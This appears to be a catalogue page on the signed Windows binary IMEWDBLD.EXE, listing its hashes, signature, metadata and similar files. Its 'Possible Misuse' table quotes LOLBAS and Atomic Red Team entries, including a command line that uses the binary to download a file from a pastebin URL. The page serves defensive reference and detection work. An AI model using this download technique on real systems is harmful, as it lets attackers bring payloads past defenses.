---
title: IMEWDBLD.EXE | Microsoft IME Open Extended Dictionary Module
excerpt: What is IMEWDBLD.EXE?
---

# IMEWDBLD.EXE 

* File Path: `C:\WINDOWS\SysWOW64\IME\SHARED\IMEWDBLD.EXE`
* Description: Microsoft IME Open Extended Dictionary Module

## Screenshot

![IMEWDBLD.EXE](screenshots/IMEWDBLD.EXE-CB30AD795C9B30E71EB1E596D18B7A21.png)

## Hashes

Type | Hash
-- | --
MD5 | `F042BFE4E2BE1EF592D9CFA14F8E6BD1`
SHA1 | `BB21C1AAAEAA9ECBE0B8561CA1B7564A359B9320`
SHA256 | `7573D6C63A143B5E03461A581D53DE6262D8B934640E58F31179611911CD7005`
SHA384 | `1FF426AD3B8473EC44420EF9A099E69CE53E3041462BDD557A6C5FFFDA798F379CF147BC2AC873B4608EB6F0F8173C92`
SHA512 | `617957311C659CCBFACE1A8DA9AC8F1F75C9B44D6EA2746315D6B996FB1ED481FBD9C85A033B342E94BDCD0B313DC4160007D1B974E52AABB95034225BF17121`
SSDEEP | `6144:9QzjRRIIhiuyh31jz7eKOx4SvH559UlaLecVGEPnmlw03q507Gs/UEVTppkX+Cp:9QzVRIIhidJ3eKOx48H559lLemGEu80C`

## Signature

* Status: Signature verified.
* Serial: `330000023241FB59996DCC4DFF000000000232`
* Thumbprint: `FF82BC38E1DA5E596DF374C53E3617F7EDA36B06`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: imewdbld.exe
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 10.0.18362.1 (WinBuild.160101.0800)
* Product Version: 10.0.18362.1
* Language: Language Neutral
* Legal Copyright:  Microsoft Corporation. All rights reserved.


## File Similarity (ssdeep match)

File | Score
-- | --
[C:\WINDOWS\system32\IME\SHARED\IMEWDBLD.EXE](IMEWDBLD.EXE-77CB1EF779047326258ABC9463F8C290.md) | 33
[C:\Windows\system32\IME\shared\IMEWDBLD.EXE](IMEWDBLD.EXE-8B8C8F73B4E96963DD9A6E760C5F77DD.md) | 33
[C:\WINDOWS\system32\IME\SHARED\IMEWDBLD.EXE](IMEWDBLD.EXE-CB30AD795C9B30E71EB1E596D18B7A21.md) | 36
[C:\Windows\system32\IME\SHARED\IMEWDBLD.EXE](IMEWDBLD.EXE-FBEE6DD18640B1575FF98D1EB3B51724.md) | 35
[C:\Windows\SysWOW64\IME\shared\IMEWDBLD.EXE](IMEWDBLD.EXE-0984D217E10D11B2DBB8CCD47CDF36BD.md) | 41
[C:\WINDOWS\SysWOW64\IME\SHARED\IMEWDBLD.EXE](IMEWDBLD.EXE-1C59A3B1176433281CEDA631F8D5D3EC.md) | 36
[C:\Windows\SysWOW64\IME\SHARED\IMEWDBLD.EXE](IMEWDBLD.EXE-40FBB367D0F83472C170359D6E3446A0.md) | 38
[C:\windows\SysWOW64\IME\SHARED\IMEWDBLD.EXE](IMEWDBLD.EXE-8EDFF2D1145341D7B23D012B29910539.md) | 29
[C:\Windows\SysWOW64\IME\SHARED\IMEWDBLD.EXE](IMEWDBLD.EXE-B840116C2D5805095F46CFD8ACBD0EB8.md) | 32

## Possible Misuse

*The following table contains possible examples of `IMEWDBLD.EXE` being misused. While `IMEWDBLD.EXE` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [IMEWDBLD.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/IMEWDBLD.yml) | `Name: IMEWDBLD.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [IMEWDBLD.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/IMEWDBLD.yml) | `- Command: C:\Windows\System32\IME\SHARED\IMEWDBLD.exe https://pastebin.com/raw/tdyShwLw`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [IMEWDBLD.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/IMEWDBLD.yml) | `Description: IMEWDBLD.exe attempts to load a dictionary file, if provided a URL as an argument, it will download the file served at by that URL and save it to %LocalAppData%\Microsoft\Windows\INetCache\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION> or %LocalAppData%\Microsoft\Windows\INetCache\IE\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [IMEWDBLD.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/IMEWDBLD.yml) | `- Path: C:\Windows\System32\IME\SHARED\IMEWDBLD.exe`{:.highlight .language-yaml} | 
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/index.md) | - Atomic Test #17: Download a file with IMEWDBLD.exe [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [windows-index.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/Indexes/Indexes-Markdown/windows-index.md) | - Atomic Test #17: Download a file with IMEWDBLD.exe [windows] | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | - [Atomic Test #17 - Download a file with IMEWDBLD.exe](#atomic-test-17---download-a-file-with-imewdbldexe) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | ## Atomic Test #17 - Download a file with IMEWDBLD.exe | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | Use IMEWDBLD.exe (built-in to windows) to download a file. This will throw an error for an invalid dictionary file. | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | $imewdbled = $env:SystemRoot + "\System32\IME\SHARED\IMEWDBLD.exe" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)



MIT License. Copyright (c) 2020-2021 Strontic.


